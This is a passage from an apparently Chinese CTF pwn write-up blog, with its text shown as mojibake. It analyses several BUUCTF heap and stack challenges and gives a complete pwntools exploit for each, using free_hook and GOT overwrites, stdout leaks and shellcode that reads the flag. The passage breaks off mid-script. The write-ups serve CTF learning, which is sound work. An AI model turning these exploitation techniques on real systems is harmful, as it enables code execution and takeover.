href="#roarctf-2019-realloc-magic" class="headerlink" title="roarctf_2019_realloc_magic"></a><code>roarctf_2019_realloc_magic</code></h2><h3 id="åˆ†æ-19"><a href="#åˆ†æ-19" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><h4 id="æ¼æ´ç‚¹-4"><a href="#æ¼æ´ç‚¹-4" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h4><ul><li>UAF</li></ul><p>ç¨‹åºç”¨reallocå‡½æ•°æ¥åˆ†é…å †å—ï¼Œå› ä¸ºä¸ç†Ÿæ‚‰è¿™ä¸ªæçš„æˆ‘ï¼Œå¥½ä¹…æ²¡æœ‰åšå‡ºæ¥ã€‚</p><h3 id="çŸ¥è¯†ç‚¹-1"><a href="#çŸ¥è¯†ç‚¹-1" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><h4 id="reallocçš„ç‰¹ç‚¹"><a href="#reallocçš„ç‰¹ç‚¹" class="headerlink" title="reallocçš„ç‰¹ç‚¹"></a>reallocçš„ç‰¹ç‚¹</h4><p>åŸºç¡€åŠŸèƒ½æ˜¯æ”¹å˜<code>mem_address</code>æ‰€æŒ‡å†…å­˜åŒºåŸŸçš„å¤§å°ä¸ºnewsizeé•¿åº¦ã€‚è¿™é‡Œå°±æœ‰å‡ ç§ä¸åŒçš„æƒ…å†µ</p><ul><li>1.å½“sizeä¸º0ï¼Œè¿™æ—¶å°±ç›¸å½“äºfree()å‡½æ•°ï¼ŒåŒæ—¶è¿”å›å€¼ä¸ºnull</li><li>2.å½“æŒ‡é’ˆä¸º0ï¼Œsizeå¤§äº0ï¼Œç›¸å½“äºmallocå‡½æ•°</li><li>3.sizeå°äºç­‰äºåŸæ¥çš„sizeï¼Œåˆ™åœ¨åŸå…ˆçš„åŸºç¡€ä¸Šç¼©å°ï¼Œå¤šä½™çš„å †å—freeæ‰</li><li>4.sizeå¤§äºåŸæ¥çš„sizeï¼Œå¦‚æœ<strong>æœ‰è¶³å¤Ÿç©ºé—´</strong>å°±åŸåŸºç¡€æ‰©å……ï¼Œç©ºé—´ä¸è¶³åˆ™åˆ†é…æ–°çš„å†…å­˜ï¼Œå¹¶å°†åŸæ¥æŒ‡é’ˆæŒ‡å‘çš„å †å—æ—§å†…å®¹å¤åˆ¶åˆ°æ–°çš„å †å—å†…å­˜ä¸­ï¼Œç„¶åå†å°†åŸæ¥çš„å †å—freeæ‰ã€‚</li></ul><p>å…¶ä¸­ç¬¬4ç‚¹ï¼Œæœ‰è¶³å¤Ÿç©ºé—´ï¼Œç”»å›¾è§£é‡Šä¸€ä¸‹ï¼š</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/uqru5B.png" srcset="/img/loading.gif" alt></p><p>ç”±äºè¿™ä¸ªç‰¹æ€§ï¼Œæ¥åˆ¶ä½œ3ä¸ªå †å—Aã€Bã€Cï¼ŒBå †å—ä½œä¸ºè¿›å…¥unsortbinçš„å †å—å­˜åœ¨ï¼ŒCæ˜¯ä¸ºäº†é˜²æ­¢ä¸è®©Cåˆå¹¶top chunkï¼Œç„¶åç”¨Aæ¥ç”³è¯·ä¸€ä¸ªsize&lt;=ï¼ˆAçš„size + Bçš„sizeï¼‰çš„å †å—ï¼Œè¿™æ ·å°±é€ æˆäº†å †å—çš„é‡å ã€‚</p><h4 id="åˆ©ç”¨-IO-2-1-stdout-æ¥æ³„æ¼ä¿¡æ¯"><a href="#åˆ©ç”¨-IO-2-1-stdout-æ¥æ³„æ¼ä¿¡æ¯" class="headerlink" title="åˆ©ç”¨ _IO_2_1_stdout_ æ¥æ³„æ¼ä¿¡æ¯"></a><code>åˆ©ç”¨ _IO_2_1_stdout_ æ¥æ³„æ¼ä¿¡æ¯</code></h4><p>å‚è€ƒé“¾æ¥ï¼š<br><a href="http://pzhxbz.cn/?p=139" target="_blank" rel="noopener">http://pzhxbz.cn/?p=139</a></p><p><a href="http://blog.eonew.cn/archives/1190" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1190</a></p><p><a href="http://blog.eonew.cn/archives/1190" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1190</a></p><p>è¿™ä¸ªé¢˜å› ä¸ºæœ‰è¿‡è¾“å‡ºï¼Œå…¶<code>_IO_CURRENTLY_PUTTING</code>å°±æ˜¯ä¸º1çš„ ï¼Œå¯¹äº<code>_IO_IS_APPENDING</code>è¿™ä¸ªflagçš„å€¼ï¼Œå°†è¿™ä¸ªflagææˆ1ä¹‹åï¼Œå°±å¯ä»¥é€šè¿‡ä¿®æ”¹<code>_IO_buf_base</code>æ¥å®Œæˆleakã€‚</p><p>åœ¨èµ›é¢˜ä¸­ï¼Œå¾ˆå¤šç¨‹åºéƒ½æ˜¯ç”¨è¿‡è¾“å‡ºå‡½æ•°è¿›è¡Œè¾“å‡ºçš„ï¼ŒåŸºæœ¬å°±æ˜¯æ”¹æ‰flagï¼Œä¸­é—´çš„ä¸‰ä¸ªå˜é‡åœ¨è¾“å‡ºçš„è¿‡ç¨‹ä¸­éƒ½ä¸æ€ä¹ˆç”¨å¾—åˆ°ï¼Œç›´æ¥ç›–æˆ0,ä½ä½è¦†ç›–<code>_IO_buf_base</code>ä¸ºåˆé€‚çš„å€¼å°±å¯ä»¥å®Œæˆleakã€‚</p><p>Flag æ€ä¹ˆè®¾ç½®ï¼Œåœ¨èµ›é¢˜ä¸­è¿˜æ˜¯å¾ˆéšæ„çš„ï¼š</p><pre><code>0xfbad18870xfbad3c80</code></pre><p>é‡ç‚¹å°±æ˜¯è®©<code>stdout-&gt;_IO_read_end == stdout-&gt;_IO_write_base</code></p><p>å¤§ä½“çš„åˆ©ç”¨æ–¹æ³•å°±æ˜¯åˆ©ç”¨unsorted binçš„åœ¨tcacheæˆ–fastbinçš„fdä¸Šç•™ä¸‹<code>main_arena</code>çš„åœ°å€ï¼Œç”±äº<code>_IO_2_1_stdout_</code>ä¸<code>arena</code>åªç›¸å·®4ä½ï¼Œä¸”ä½ä¸‰ä½å·²çŸ¥ï¼Œåœ¨ä¼ å…¥æ˜¯ä½3ä½è¦†ç›–fdç•™ä¸‹çš„<code>main_arena</code>çš„åœ°å€ï¼Œå‰©ä½™ä¸€ä½å¯ä»¥çˆ†ç ´ï¼Œæ¦‚ç‡1/16,ä»è€ŒåŠ«æŒstdoutä»¥è¾¾åˆ°æ³„éœ²çš„ç›®çš„ ã€‚</p><h2 id="exp-21"><a href="#exp-21" class="headerlink" title="exp"></a>exp</h2><pre><code class="python">from pwn import *import timelocal_file  = &#39;./roarctf_2019_realloc_magic&#39;elf = ELF(local_file)# context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,28690)    libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]rce18 = [0x4f2c5,0x4f322,0x10a38c]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size,data):    sla(&#39;&gt;&gt;&#39;,&#39;1&#39;)    sla(&#39;?&#39;,str(size))    if int(size) != 0 :        sa(&#39;?&#39;,str(data))def free():    sla(&#39;&gt;&gt;&#39;,&#39;2&#39;)def leak_addr():    add(0x80,&#39;aaaaaaa&#39;)    add(0,&#39;&#39;)    add(0x100,&#39;aaaaaaaa&#39;)    add(0,&#39; &#39;)    add(0x110,&#39; &#39;)    add(0,&#39;&#39;)    add(0x100,&#39;a&#39;)    for i in range(7):        free()    add(0,&#39;1&#39;)    add(0x80,&#39;\x60\x87&#39;)    payload = 17 * p64(0) + p64(0x61) + &#39;\x60\x87&#39;    add(0x190,payload)    add(0,&#39;&#39;)    add(0x100,&#39;\x60\x87&#39;)    add(0,&#39;&#39;)    payload = p64(0xfbad3c80) + &#39;\x00&#39; * 8 * 3 + &#39;\x00&#39;    add(0x100,payload)leak = 0while True:    try:        leak_addr()        ss = io.recvuntil(chr(0x7f),timeout = 0.5)        if len(ss) == 0:            raise Exception(&#39;&#39;)        io.recv(16)        leak = u64(io.recv(8))        if leak == 0x320a6464412e310a:            raise Exception(&#39;&#39;)        break    except Exception:        io.close()        # io = process(&#39;./roarctf_2019_realloc_magic&#39;)        io = remote(&#39;node3.buuoj.cn&#39;,28690)        continueleak = leak &gt;&gt; 16info_addr(&#39;leak&#39;,leak)libc_base = leak - 4110208info_addr(&#39;libc_base&#39;,libc_base)free_hook = 4118760 + libc_basesys_addr = 324832+libc_basesla(&#39;&gt;&gt;&#39;,&#39;666&#39;)add(0x120,&#39;aaaaaaa&#39;)add(0,&#39;&#39;)add(0x130,&#39;aaaaaaaa&#39;)add(0,&#39; &#39;)add(0x160,&#39; &#39;)add(0,&#39;&#39;)add(0x130,&#39;a&#39;)for i in range(7):    free()add(0,&#39;1&#39;)add(0x120,&#39;\x60\x87&#39;)payload = 37 * p64(0) + p64(0x71) + p64(free_hook)add(0x260,payload)add(0,&#39;&#39;)add(0x130,&#39;a&#39;)add(0,&#39;&#39;)one_rec = rce18[1] +libc_baseadd(0x130,p64(one_rec))free()# debug()itr()</code></pre><p>å…¶ä¸­expçš„çˆ†ç ´stdoutéƒ¨åˆ†ï¼Œå¯ä»¥å½“ä½œæ¨¡ç‰ˆä½¿ç”¨ï¼Œæ¥è‡ªpzhxbzå¤§ä½¬çš„ã€‚</p><h2 id="ciscn-2019-en-3"><a href="#ciscn-2019-en-3" class="headerlink" title="ciscn_2019_en_3"></a><code>ciscn_2019_en_3</code></h2><h3 id="åˆ†æ-20"><a href="#åˆ†æ-20" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>å¸¸è§„å †é¢˜ï¼ŒUAFï¼Œdupæ‰“<code>free_hook_</code>ã€‚ä¸Šæ¥ç”¨<code>puts(&amp;s)</code>ï¼Œæ¥æ³„æ¼æ ˆä¸Šå­˜åœ¨çš„libcåœ°å€ã€‚</p><h3 id="exp-22"><a href="#exp-22" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./ciscn_2019_en_3&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,29542)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = [0x4f2c5,0x4f322,0x10a38c]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size,data):    sla(&#39;ice&#39;,&#39;1&#39;)    sla(&#39;size&#39;,str(size))    sa(&#39;story&#39;,str(data))def free(idx):    sla(&#39;ice&#39;,&#39;4&#39;)    sla(&#39;dex&#39;,str(idx))payload = &#39;a&#39; * (0x20-8)sa(&#39;name&#39;,payload)sa(&#39;ID&#39;,&#39;chumen77&#39;)ru(&#39;chumen77&#39;)libc_base = uu64(r(6)) - 0x81237info_addr(&#39;libc_base&#39;,libc_base)add(0x50,&#39;aaaaaaaa&#39;)free(0)free(0)free_hook = libc_base + 0x3ed8e8add(0x50,p64(free_hook))add(0x50,p64(free_hook))rec = rce18[1] + libc_baseadd(0x50,p64(rec))free(0)itr()</code></pre><h2 id="æå®¢å¤§æŒ‘æˆ˜2019-Not-bad"><a href="#æå®¢å¤§æŒ‘æˆ˜2019-Not-bad" class="headerlink" title="æå®¢å¤§æŒ‘æˆ˜2019 Not bad"></a>æå®¢å¤§æŒ‘æˆ˜2019 Not bad</h2><h3 id="åˆ†æ-21"><a href="#åˆ†æ-21" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>æº¢å‡º0x18ä¸ªå­—èŠ‚ï¼ŒåŠ ä¸Šæœ¬èº«çš„æ ˆé•¿åº¦ï¼Œè¯»orw çš„shellcodeå†…å­˜ä¸æ˜¯å¾ˆå¤Ÿç”¨ã€‚éœ€è¦è¿ç§»åˆ°mmapï¼Œè¿›è¡Œorwã€‚æ‰€ä»¥æ‘†åœ¨æ ˆä¸Šçš„shellcodeå°±æ˜¯ï¼Œæ¥ä¸€ä¸ªreadå‡½æ•°ï¼ŒæŠŠorwæ”¾åœ¨mmapä¸Šï¼Œç„¶åå†è·³è½¬ä¸Šå»æ‰§è¡Œå³å¯ã€‚å¹¶ä¸”å†æ¬¡ç”¨åˆ° <code>jmp rsp</code> + shellcode.</p><h3 id="exp-23"><a href="#exp-23" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./bad&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,29794)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()mmap = 0x123000jmp_rsp = 0x0000000000400a01# bss = 0x6010B0 - 0x20orw = asm(shellcraft.open(&quot;./flag&quot;))orw += asm(shellcraft.read(3,&quot;rsp&quot;,0x30))orw += asm(shellcraft.write(1,&quot;rsp&quot;,0x30))payload = asm(shellcraft.read(0,mmap + 0x300,0x100)) + asm(&#39;mov rax,0x123300;call rax&#39;)payload = payload.ljust(0x28,&#39;a&#39;)payload += p64(jmp_rsp) +   asm(&#39;sub rsp,0x30;jmp rsp&#39;)sa(&#39;fun&#39;,payload)s(orw)itr()</code></pre><h2 id="ciscn-2019-final-5"><a href="#ciscn-2019-final-5" class="headerlink" title="ciscn_2019_final_5"></a><code>ciscn_2019_final_5</code></h2><h3 id="åˆ†æ-22"><a href="#åˆ†æ-22" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><pre><code>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>ä¿æŠ¤å¼€çš„ä¸å¤šï¼Œåˆ†æå’Œåˆ©ç”¨èµ·æ¥ç®€å•ä¸å°‘ã€‚</p><p>è¿™ä¸ªé¢˜éš¾ç‚¹å°±æ˜¯åœ¨äºå‘ç°æ¼æ´ç‚¹ã€‚</p><h4 id="addå‡½æ•°"><a href="#addå‡½æ•°" class="headerlink" title="addå‡½æ•°"></a>addå‡½æ•°</h4><pre><code class="c"> __int64 result; // rax  signed int i; // [rsp+4h] [rbp-1Ch]  int size; // [rsp+8h] [rbp-18h]  int idx; // [rsp+Ch] [rbp-14h]  void *buf; // [rsp+10h] [rbp-10h]  __int64 v5; // [rsp+18h] [rbp-8h] printf(&quot;index: &quot;);  idx = read_int();  if ( idx &lt; 0 || idx &gt; 16 )  {    puts(&quot;index is invalid.&quot;);    exit(-1);  }  printf(&quot;size: &quot;);  size = read_int();  if ( size &lt; 0 || size &gt; 0x1000 )  {    puts(&quot;size is invalid.&quot;);    exit(-1);  }  buf = malloc(size);  if ( !buf )  {    puts(&quot;malloc error.&quot;);    exit(-1);  }  printf(&quot;content: &quot;);  read(0, buf, size);  show_diy((__int16)buf);</code></pre><p>å¯ä»¥è‡ªå®šä¹‰è¾“å…¥å †çš„ç¼–å·ï¼Œæœ€å¤§å¯ä»¥17ä¸ªï¼Œå°±æ„Ÿè§‰æœ‰ç‚¹å¥‡æ€ªã€‚ç„¶åä»¥æ ˆä¸Šçš„ä¸€ä¸ªbufæ¥å­˜å–åˆ†é…heapçš„åœ°å€ã€‚</p><pre><code class="c">result = sub_400AB0((__int64)buf, idx);  v5 = result;  for ( i = 0; i &lt;= 16; ++i )  {    result = heaplist_idx[i];    if ( !result )    {      heaplist_idx[i] = v5;      result = i;      sizelist[i] = size;      break;    }  }</code></pre><pre><code class="c">__int64 __fastcall sub_400AB0(__int64 a1, int a2){  return a1 | a2;}</code></pre><p>å¯ä»¥çœ‹åˆ°ä»¥å †åœ°å€ä¸å †çš„idè¿›è¡Œä»¥æ¥ä¸€ä¸ª<code>|</code> è¿ç®—ã€‚ç„¶åè¿”å›å›æ¥ç»™v5ï¼Œç„¶ååœ¨å­˜å…¥bssçš„ä¸€æ®µåœ°å€ä¸­ã€‚ç®—æ˜¯å¤„ç†è¿‡çš„å †åœ°å€ã€‚</p><p>å°è¯•ç ”ç©¶ä¸€ä¸‹ï¼Œåšå®Œå¤„ç†æ˜¯ä»€ä¹ˆæ ·å­ï¼š</p><p>å…ˆåˆ†é…ä¸€ä¸ªå †å·ä¸º1 å’Œ 16çš„å †å—ï¼Œçœ‹ä¸‹bssé‡Œé¢æ˜¯å­˜å…¥äº†ä»€ä¹ˆã€‚</p><pre><code>x/30gx  0x6020E00x6020e0:       0x0000000000e35270(16)      0x0000000000e35281(0)</code></pre><pre><code>In [2]: hex(0x0e35260 | 16)Out[2]: &#39;0xe35270&#39;In [3]: hex(0x00e35281 | 0)Out[3]: &#39;0xe35281&#39;</code></pre><p>å·®ä¸å¤šå°±æ˜¯è¿™æ ·ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥å‘ç°ç‚¹å¼‚æ ·ã€‚å› ä¸ºæ˜¯<code>|</code> çš„é€»è¾‘è¿ç®—ï¼Œåœ¨<code>0-0xf</code>æ˜¯ä¸€ä¸ªè½®å›åï¼Œåˆ°äº†16å°±åˆç®—æ˜¯ä¸€ä¸ªè½®å›ã€‚<br>æ—¢ç„¶å¤„ç†è¿‡å †åœ°å€ï¼Œé‚£è‚¯å®šå–å‡ºæ¥è¿›è¡Œæ“ä½œæ—¶ï¼Œè‚¯å®šè¿˜ä¼šå†è¿›è¡Œå¤„ç†å›æ¥ã€‚ä¸‹é¢å°±æ˜¯æ³¨æ„æ€ä¹ˆå¤„ç†çš„ã€‚</p><h4 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h4><pre><code class="c"> for ( i = 0; i &lt;= 16; ++i )  {    result = get_idx(heaplist_idx[i]);    if ( result == idx )    {      printf(&quot;content: &quot;);      read_diy((void *)(heaplist_idx[i] &amp; 0xFFFFFFFFFFFFFFF0LL), sizelist[i]);      result = puts(&quot;edit success.\n&quot;);      break;    }  }</code></pre><pre><code class="c">__int64 __fastcall get_idx(char a1){  return a1 &amp; 0xF;}</code></pre><p>å¯ä»¥çœ‹åˆ°å…¶æ˜¯ä¾æ¬¡0-17ç¼–å·å¯¹å †å—è¿›è¡Œéå†å–å‡ºï¼Œå†å–å‡ºæ—¶ä¼šå¯¹å…¶è¿›è¡Œ<code>&amp; 0xf</code>çš„æ“ä½œæ¥å°è¯•è·å–å †å—çš„ç¼–å·ã€‚</p><p>æ¥æµ‹è¯•ä¸€ä¸‹ï¼š</p><pre><code class="c">In [5]: hex(0x00e35281 &amp; 0xf). #1å·å †å—çš„è®¡ç®—Out[5]: &#39;0x1&#39;In [6]: hex(0x00e35270 &amp; 0xf) #16å·å †å—çš„è®¡ç®—Out[6]: &#39;0x0&#39;</code></pre><p>è¿™å°±å¾ˆæ˜æ˜¾æœ‰å¼‚æ ·äº†ï¼Œç”³è¯·çš„æ˜¯16å·å †å—å…¶è®¤ä¸ºæ˜¯0å·å †å—ã€‚æ‰€ä»¥ç”³è¯·16å·çš„å †å—ï¼Œå…¶å¯ä»¥ç”¨editï¼ˆ0ï¼‰æ¥è¿›è¡Œç¼–è¾‘16å·å †å—ã€‚</p><p>ç„¶åçœ‹å…¶å¦‚ä½•ç¼–è¾‘çš„ï¼š</p><pre><code class="c">  read_diy((void *)(heaplist_idx[i] &amp; 0xFFFFFFFFFFFFFFF0LL), sizelist[i]);</code></pre><p>å…¶æ˜¯æ ¹æ®bssä¸Šå­˜çš„å¤„ç†è¿‡å †å—åœ°å€è¿›è¡Œä¸€ä¸‹<code>&amp; 0xFFFFFFFFFFFFFFF0</code> æ¥è¿›è¡Œç¼–è¾‘çš„ã€‚<br>å¯¹äºä¸Šæ¥å°±ç”³è¯·äº†ä¸€ä¸ª16å·çš„å †å—ï¼Œå¾ˆå®¹æ˜“çŸ¥é“å…¶å †å—çš„æœ«3ä¸ºåº”è¯¥æ˜¯0x260ï¼Œä½†æ˜¯å½“æ—¶å­˜å…¥çš„æ˜¯0x270ï¼Œå°è¯•è¿›è¡Œä¸€ä¸‹<code>&amp; 0xFFFFFFFFFFFFFFF0</code>ï¼š</p><pre><code>In [7]: hex(0x00e35270 &amp; 0xFFFFFFFFFFFFFFF0)Out[7]: &#39;0xe35270&#39;</code></pre><p>å‘ç°å¹¶ä¸æ˜¯ä»0x260è¿›è¡Œç¼–è¾‘ï¼Œä½†æ˜¯åŒæ ·è¿˜æ˜¯å¯ä»¥ç¼–è¾‘åŒæ ·çš„sizeï¼Œæ‰€ä»¥è¿™å°±é€ æˆäº†æº¢å‡ºï¼Œå¹¶ä¸”æ˜¯0x10ä¸ªå­—èŠ‚ã€‚</p><h4 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><ul><li>é‡Šæ”¾2ä¸ªtcache å †å—ï¼Œå¹¶ä¸”åˆ©ç”¨0x10å­—èŠ‚ï¼Œæ”¹å…¶ä¸­ä¸€ä¸ªå †å—çš„fdï¼Œæ”¹ä¸ºfreeçš„gotä½ç½®</li><li>ç”³è¯·å †å—åˆ°free gotå¤„ï¼Œæ”¹free ä¸º puts</li><li>æ„é€ å‡ºä¸€ä¸ªunsortbinçš„å †å—ï¼Œç„¶åå†ç”³è¯·ä¸€ä¸ªå †å—ï¼Œå°±ä¼šåœ¨è¿™ä¸ªå †å—ä¸Šç•™ä¸‹éƒ¨åˆ†çš„libcåœ°å€ï¼Œç„¶åè¿›è¡Œleak</li><li>ç®—å‡ºsystemçš„åœ°å€ï¼Œç»§ç»­æ”¹free got å¤„ä¸º systemï¼Œç„¶åfreeä¸€ä¸ªå¸¦æœ‰<code>/bin/sh\x00</code>çš„å †å—ï¼Œå³å¯æ‹¿åˆ°shell</li></ul><h3 id="exp-24"><a href="#exp-24" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *import timelocal_file  = &#39;./ciscn_final_5&#39;elf = ELF(local_file)# context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,27180)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = [0x4f2c5,0x4f322,0x10a38c]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(idx,size,data):    sla(&#39;choice:&#39;,&#39;1&#39;)    sla(&#39;dex&#39;,str(idx))    sla(&#39;size&#39;,str(size))    sa(&#39;content&#39;,str(data))def free(idx):    sla(&#39;choice:&#39;,&#39;2&#39;)    sla(&#39;dex&#39;,str(idx))def edit(idx,data):    sla(&#39;choice:&#39;,&#39;3&#39;)    sla(&#39;dex&#39;,str(idx))    sa(&#39;content&#39;,str(data))add(16,0x18,&#39;sasdasdas&#39;)add(1,0x30,&#39;aaaaaaaa&#39;)add(2,0x30,&#39;aaaaaaaa&#39;)free(2)free(1)edit(0,p64(0) + p64(0x121) + p64(0x000000000602010))add(5,0x800,&#39;aaaaaaaa&#39;)add(6,0x50,&#39;aaaa&#39;)add(3,0x30,&#39; &#39;)free(5)add(7,0x90,&#39; &#39;)add(4,0x30,&#39;aaaaaaaa&#39; + p64(elf.plt[&#39;puts&#39;]))free(7)r()libc_base = uu64(r(6)) - 0x3ec120info_addr(&#39;libc_base&#39;,libc_base)edit(4,&#39;aaaaaaaa&#39; + p64(libc.sym[&#39;system&#39;] + libc_base))add(9,0x10,&#39;/bin/sh\x00&#39;)free(9)itr()</code></pre><p>ç”±äºå…¶ç¡®å®šå †å—çš„ç‰¹æ®Šæ€§ï¼Œåœ¨ç”³è¯·å †å—åˆ°free gotæ—¶ï¼Œå› ä¸ºå…¶åœ¨<code>0x000000000602018</code>ï¼Œä½†æ˜¯åœ¨ç»è¿‡é€»è¾‘è¿ç®—å¤„ç†åï¼Œæ”¾å…¥bssåï¼Œæƒ³è¦å†è¿›è¡Œæ“ä½œå°±æœ‰ç‚¹å›°éš¾ï¼Œæ‰€ä»¥ç”³è¯·åˆ°<code>0x000000000602010</code> å°±OKäº†ã€‚</p><h2 id="ciscn-2019-s-1"><a href="#ciscn-2019-s-1" class="headerlink" title="ciscn_2019_s_1"></a><code>ciscn_2019_s_1</code></h2><h3 id="åˆ†æ-23"><a href="#åˆ†æ-23" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ä¿æŠ¤ï¼š</p><pre><code>[*] &#39;/ctf/work/buuctf/shuati/ciscn_2019_s_1/ciscn_s_1&#39;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>Addå‡½æ•°ï¼šæœ€å¤šå¯ä»¥ç”³è¯·33ä¸ªå †ï¼Œä¸”é—®ä½ å †çš„ç¼–å·ï¼Œå¹¶ä¸”æ ¹æ®è¿™ä¸ªç¼–å·ä½œä¸ºç´¢å¼•ä¸Šbssæ®µæ¥å­˜å‚¨heapçš„åœ°å€ã€‚å¤§å°èŒƒå›´åœ¨<code>0x7f - 0x100</code>ã€‚</p><p>editå‡½æ•°ï¼š</p><pre><code class="c">v0[read(0, (void *)heap[v2], (signed int)len[v2])] = 0;</code></pre><p>æ˜æ˜¾å­˜åœ¨ç€off by nullã€‚ä¸”æœ‰key1æ§åˆ¶ç€ï¼Œåªèƒ½ç¼–è¾‘2æ¬¡ã€‚</p><pre><code class="c">if ( key1 == 2 )    exit(0);</code></pre><p>Showå‡½æ•°ï¼š<br>Key2æœ‰å€¼æ‰èƒ½ç”¨ã€‚</p><h4 id="åˆ©ç”¨-1"><a href="#åˆ©ç”¨-1" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><ul><li>ç”±äºæ²¡æœ‰å¼€å¯pieä¿æŠ¤ï¼Œè¿™æ ·æ˜æ˜¾å¯ä»¥unlinkæ”»å‡»ï¼Œç”³è¯·ä¸€ä¸ª32å †å·çš„å †ï¼Œå¤§å°0xf8ï¼Œéƒ½æ˜¯è¶Šå¤§è¶Šå¥½ï¼Œä¸ºäº†ä¸Šé è¿‘key1ã€key2ï¼Œç„¶åè¿›è¡Œæ§åˆ¶.</li></ul><p>å‰©ä¸‹çš„å°±å¾ˆç®€å•äº†ã€‚</p><h3 id="exp-25"><a href="#exp-25" class="headerlink" title="exp"></a>exp</h3><pre><code class="c">from pwn import *import timelocal_file  = &#39;./ciscn_s_1&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,29756)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = [0x4f2c5,0x4f322,0x10a38c]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          